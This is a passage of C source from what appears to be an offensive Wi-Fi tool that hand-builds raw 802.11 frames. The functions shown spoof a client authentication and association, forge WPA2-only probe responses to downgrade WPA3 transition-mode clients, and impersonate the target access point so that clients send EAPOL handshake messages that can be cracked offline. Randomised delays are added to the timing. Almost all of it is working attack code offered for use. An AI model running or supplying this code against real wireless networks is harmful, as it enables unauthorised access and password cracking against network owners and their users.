        frame[p++]=0xb0; frame[p++]=0x00; /* Auth */
        frame[p++]=0x00; frame[p++]=0x00;
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6; /* dst: AP */
        memcpy(&frame[p], rogue, 6); p+=6;           /* src: rogue */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6; /* bssid: AP */
        { uint16_t seq = next_seq_client(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
        frame[p++]=0x00; frame[p++]=0x00; /* Auth Algo: Open System */
        frame[p++]=0x01; frame[p++]=0x00; /* Auth Seq: 1 */
        frame[p++]=0x00; frame[p++]=0x00; /* Status: Success */
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    usleep(jitter_usleep(50000)); /* ~35-65ms - let AP process auth (jittered) */

    /* Phase 2: Association Request with RSN IE */
    {
        int p = 0;
        int ssid_len = strlen(ap->ssid);
        if (ssid_len > 32) ssid_len = 32;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        frame[p++]=0x00; frame[p++]=0x00; /* Assoc Req */
        frame[p++]=0x00; frame[p++]=0x00;
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6; /* dst: AP */
        memcpy(&frame[p], rogue, 6); p+=6;           /* src: same rogue */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6; /* bssid: AP */
        { uint16_t seq = next_seq_client(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; } /* Seq */
        /* Capability: ESS + Privacy + Short Preamble + Short Slot */
        frame[p++]=0x31; frame[p++]=0x04;
        /* Listen Interval: 3 */
        frame[p++]=0x03; frame[p++]=0x00;
        /* SSID IE */
        frame[p++]=0x00; frame[p++]=(uint8_t)ssid_len;
        memcpy(&frame[p], ap->ssid, ssid_len); p+=ssid_len;
        /* Supported Rates IE */
        frame[p++]=0x01; frame[p++]=0x08;
        frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;
        frame[p++]=0x24; frame[p++]=0x30; frame[p++]=0x48; frame[p++]=0x6c;
        /* RSN IE (WPA2-PSK, CCMP, MFP capable) */
        frame[p++]=0x30; frame[p++]=0x14; /* Tag: RSN, Length: 20 */
        frame[p++]=0x01; frame[p++]=0x00; /* Version: 1 */
        frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x04; /* Group: CCMP */
        frame[p++]=0x01; frame[p++]=0x00; /* Pairwise Count: 1 */
        frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x04; /* Pairwise: CCMP */
        frame[p++]=0x01; frame[p++]=0x00; /* AKM Count: 1 */
        frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x02; /* AKM: PSK */
        frame[p++]=0x80; frame[p++]=0x00; /* RSN Cap: MFP capable */
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    if (total > 0) {
        fprintf(stderr, "[brain] [auth+assoc] %s rogue=%02x:%02x:%02x:%02x:%02x:%02x %db\n",
                ap->ssid,
                rogue[0], rogue[1], rogue[2],
                rogue[3], rogue[4], rogue[5], total);
    }
    return total;
}


/* ============================================================================
 * RSN Downgrade Attack (Sprint 2 #3)
 * AngryOxide equivalent: rogue_m2 with WPA2-only RSN IE
 * Sends a Probe Response impersonating a WPA3 AP but advertising only
 * WPA2-PSK + CCMP. If a dual-mode (WPA2/WPA3 transition) client sees this,
 * it may attempt a WPA2 association, yielding a crackable handshake.
 * ========================================================================== */
int attack_rsn_downgrade(int sock, const bcap_ap_t *ap, const bcap_sta_t *sta) {
    uint8_t frame[512];
    int total = 0;
    int ssid_len = strlen(ap->ssid);
    if (ssid_len > 32) ssid_len = 32;

    /* Probe Response with WPA2-only RSN IE (no SAE, no MFP required) */
    {
        int p = 0;
        /* Radiotap header (minimal) */
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        /* IEEE 802.11 Probe Response */
        frame[p++]=0x50; frame[p++]=0x00; /* Type: Probe Response */
        frame[p++]=0x00; frame[p++]=0x00; /* Duration */
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;    /* dst: client */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* src: AP (impersonated) */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* bssid: AP */
        { uint16_t seq = next_seq_ap(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
        /* Timestamp (8 bytes) */
        uint64_t ts = (uint64_t)time(NULL) * 1000000ULL;
        memcpy(&frame[p], &ts, 8); p+=8;
        /* Beacon Interval */
        frame[p++]=(uint8_t)(ap->beacon_interval & 0xFF);
        frame[p++]=(uint8_t)((ap->beacon_interval >> 8) & 0xFF);
        /* Capability: ESS + Privacy + Short Preamble + Short Slot */
        frame[p++]=0x31; frame[p++]=0x04;
        /* SSID IE */
        frame[p++]=0x00; frame[p++]=(uint8_t)ssid_len;
        memcpy(&frame[p], ap->ssid, ssid_len); p+=ssid_len;
        /* Supported Rates */
        frame[p++]=0x01; frame[p++]=0x08;
        frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;
        frame[p++]=0x24; frame[p++]=0x30; frame[p++]=0x48; frame[p++]=0x6c;
        /* DS Parameter Set */
        frame[p++]=0x03; frame[p++]=0x01; frame[p++]=ap->channel;
        /* RSN IE — DOWNGRADED: WPA2-PSK only, no MFP required
         * Key difference from real AP: AKM=PSK(02) not SAE(08), no MFPC/MFPR */
        frame[p++]=0x30; frame[p++]=0x14; /* Tag: RSN, Length: 20 */
        frame[p++]=0x01; frame[p++]=0x00; /* Version: 1 */
        frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x04; /* Group: CCMP */
        frame[p++]=0x01; frame[p++]=0x00; /* Pairwise Count: 1 */
        frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x04; /* Pairwise: CCMP */
        frame[p++]=0x01; frame[p++]=0x00; /* AKM Count: 1 */
        frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x02; /* AKM: PSK (not SAE!) */
        frame[p++]=0x00; frame[p++]=0x00; /* RSN Capabilities: NO MFP */
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    if (total > 0) {
        fprintf(stderr, "[brain] [rsn-downgrade] %s -> %02x:%02x:%02x:%02x:%02x:%02x (WPA3->WPA2 probe resp)\n",
                ap->ssid,
                sta->mac.addr[0], sta->mac.addr[1], sta->mac.addr[2],
                sta->mac.addr[3], sta->mac.addr[4], sta->mac.addr[5]);
    }
    return total;
}

/* ============================================================================
 * Rogue M2 / Evil Twin Attack (AP-less handshake capture)
 * AngryOxide equivalent: rogue_m2_attack_directed
 * We impersonate the target AP and send:
 *   1. Probe Response (we ARE the AP)
 *   2. Auth Response (accept client auth)
 *   3. Association Response (accept client assoc)
 *   4. EAPOL M1 (trigger client to send M2 with crackable hash)
 * bettercap captures the M2 on the monitor interface
 * ========================================================================== */
int attack_rogue_m2(int sock, const bcap_ap_t *ap, const bcap_sta_t *sta) {
    uint8_t frame[512];
    int total = 0;
    int ssid_len = strlen(ap->ssid);
    if (ssid_len > 32) ssid_len = 32;

    /* Random nonce for EAPOL M1 */
    uint8_t anonce[32];
    for (int i = 0; i < 32; i++) anonce[i] = rand() & 0xff;

    /* Step 1: Probe Response (impersonate AP -> client) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        frame[p++]=0x50; frame[p++]=0x00; /* Probe Response */
        frame[p++]=0x00; frame[p++]=0x00;
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;    /* dst: client */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* src: AP (impersonated) */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* bssid: AP */
        { uint16_t seq = next_seq_ap(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
        /* Timestamp (8 bytes) */
        uint64_t ts = (uint64_t)time(NULL) * 1000000ULL;
        memcpy(&frame[p], &ts, 8); p+=8;
        /* Beacon Interval: 100 TU */
        frame[p++]=0x64; frame[p++]=0x00;
        /* Capability: ESS + Privacy + Short Preamble + Short Slot */
        frame[p++]=0x31; frame[p++]=0x04;
        /* SSID IE */
        frame[p++]=0x00; frame[p++]=(uint8_t)ssid_len;
        memcpy(&frame[p], ap->ssid, ssid_len); p+=ssid_len;
        /* Supported Rates */
        frame[p++]=0x01; frame[p++]=0x08;
        frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;
        frame[p++]=0x24; frame[p++]=0x30; frame[p++]=0x48; frame[p++]=0x6c;
        /* DS Parameter Set */
        frame[p++]=0x03; frame[p++]=0x01; frame[p++]=ap->channel;
        /* RSN IE */
        frame[p++]=0x30; frame[p++]=0x14;
        frame[p++]=0x01; frame[p++]=0x00;
        frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x04;
        frame[p++]=0x01; frame[p++]=0x00;
        frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x04;
        frame[p++]=0x01; frame[p++]=0x00;
        frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x02;
        frame[p++]=0x80; frame[p++]=0x00;
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    usleep(jitter_usleep(5000)); /* ~3.5-6.5ms (jittered) */

    /* Step 2: Auth Response (AP -> client, Open System seq=2, status=success) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        frame[p++]=0xb0; frame[p++]=0x00; /* Auth */
        frame[p++]=0x00; frame[p++]=0x00;
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;    /* dst: client */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* src: AP */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* bssid: AP */
        { uint16_t seq = next_seq_ap(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
        frame[p++]=0x00; frame[p++]=0x00; /* Auth Algo: Open System */
        frame[p++]=0x02; frame[p++]=0x00; /* Auth Seq: 2 (response) */
        frame[p++]=0x00; frame[p++]=0x00; /* Status: Success */
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    usleep(jitter_usleep(5000)); /* ~3.5-6.5ms (jittered) */

    /* Step 3: Association Response (AP -> client, status=success, AID=1) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        frame[p++]=0x10; frame[p++]=0x00; /* Assoc Response */
        frame[p++]=0x00; frame[p++]=0x00;
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;    /* dst: client */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* src: AP */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* bssid: AP */
        frame[p++]=0x00; frame[p++]=0x00;
        /* Capability: ESS + Privacy + Short Preamble + Short Slot */
        frame[p++]=0x31; frame[p++]=0x04;
        frame[p++]=0x00; frame[p++]=0x00; /* Status: Success */
        frame[p++]=0x01; frame[p++]=0xc0; /* AID: 0xC001 = 49153 */
        /* Supported Rates */
        frame[p++]=0x01; frame[p++]=0x08;
        frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;
        frame[p++]=0x24; frame[p++]=0x30; frame[p++]=0x48; frame[p++]=0x6c;
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    usleep(jitter_usleep(10000)); /* ~7-13ms (jittered) */

    /* Step 4: EAPOL M1 (Data frame, LLC/SNAP + EAPOL-Key with our nonce) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        /* Data frame: FC=0x08 0x02 (Data, FromDS) */
        frame[p++]=0x08; frame[p++]=0x02;
        frame[p++]=0x00; frame[p++]=0x00;
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;    /* Addr1 (RA): client */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* Addr2 (TA): AP BSSID */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* Addr3 (SA): AP */
        frame[p++]=0x00; frame[p++]=0x00;
        /* LLC/SNAP header */
        frame[p++]=0xaa; frame[p++]=0xaa; frame[p++]=0x03; /* DSAP SSAP Control */
        frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00; /* OUI */
        frame[p++]=0x88; frame[p++]=0x8e; /* EtherType: EAPOL */
        /* EAPOL header */
        frame[p++]=0x02; /* Version: 802.1X-2004 */
        frame[p++]=0x03; /* Type: EAPOL-Key */
        frame[p++]=0x00; frame[p++]=0x5f; /* Length: 95 */
        /* EAPOL-Key descriptor */
        frame[p++]=0x02; /* Descriptor Type: RSN */
        frame[p++]=0x00; frame[p++]=0x8a; /* Key Info: Pairwise + ACK (M1) */
        frame[p++]=0x00; frame[p++]=0x10; /* Key Length: 16 (CCMP) */
        /* Replay Counter: 1 (8 bytes BE) */
        frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00;
        frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x01;
        /* Key Nonce: 32 bytes (our random ANonce) */
        memcpy(&frame[p], anonce, 32); p+=32;
        /* Key IV: 16 zeros */
        memset(&frame[p], 0, 16); p+=16;
        /* Key RSC: 8 zeros */
        memset(&frame[p], 0, 8); p+=8;
        /* Key ID: 8 zeros */
        memset(&frame[p], 0, 8); p+=8;
        /* Key MIC: 16 zeros (no MIC in M1) */
        memset(&frame[p], 0, 16); p+=16;
        /* Key Data Length: 0 */
        frame[p++]=0x00; frame[p++]=0x00;
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    if (total > 0) {
        fprintf(stderr, "[brain] [rogue-m2] %s -> %02x:%02x:%02x:%02x:%02x:%02x spray %db\n",
                ap->ssid,
                sta->mac.addr[0], sta->mac.addr[1], sta->mac.addr[2],
                sta->mac.addr[3], sta->mac.addr[4], sta->mac.addr[5],
                total);
    }
    return total;
}

/* REASON_POOL sizes (for header macros) */
const size_t REASON_POOL_AP_COUNT = sizeof(REASON_POOL_AP) / sizeof(REASON_POOL_AP[0]);
const size_t REASON_POOL_STA_COUNT = sizeof(REASON_POOL_STA) / sizeof(REASON_POOL_STA[0]);
